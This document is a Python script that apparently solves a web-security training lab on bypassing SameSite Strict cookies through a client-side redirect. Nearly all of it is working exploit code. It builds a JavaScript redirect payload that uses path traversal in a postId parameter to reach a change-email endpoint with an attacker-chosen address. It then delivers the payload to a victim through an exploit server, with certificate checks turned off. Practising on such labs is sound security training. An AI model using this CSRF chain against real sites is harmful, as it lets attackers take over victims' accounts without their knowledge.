import requests
import re
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SameSite Strict bypass via client-side redirect"


def post_data(url, data):
    try:
        return requests.post(url, data=data, verify=False)
    except Exception as e:
        print(f"[!] Failed to post data: {e}")
        return None


def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Exploit the redirection functionality that occurs after a comment is submitted in order to redirect the victim to their profile and change their email using URL parameters\n2. Deliver the exploit to the victim\n3. The victim's email will be changed after they trigger the exploit\n""")

    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    try:
        # Step 1: Ask for exploit server URL
        exploit_server = input(
            "[?] Enter the exploit server URL: ").strip().rstrip('/')
        
        url=url.rstrip('/')
        # Step 2: Build and deliver exploit
        new_email = "mystic_mido@mystic_mido.com"
        payload = f"""<script>
                    location = "{url}/post/comment/confirmation?postId=../my-account/change-email%3femail={new_email}%26submit=1"
                </script>"""

        exploit_data = {
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "responseBody": payload,
            "formAction": "DELIVER_TO_VICTIM",
            "urlIsHttps": "on",
            "responseFile": "/exploit"
        }

        res = post_data(exploit_server + "/", exploit_data)
        if res and res.status_code == 200:
            print("[+] Exploit delivered successfully!")
            print("[+] Wait few seconds and click on screen!")
            return True
        else:
            print("[-] Exploit delivery failed.")
            return False

    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        return False
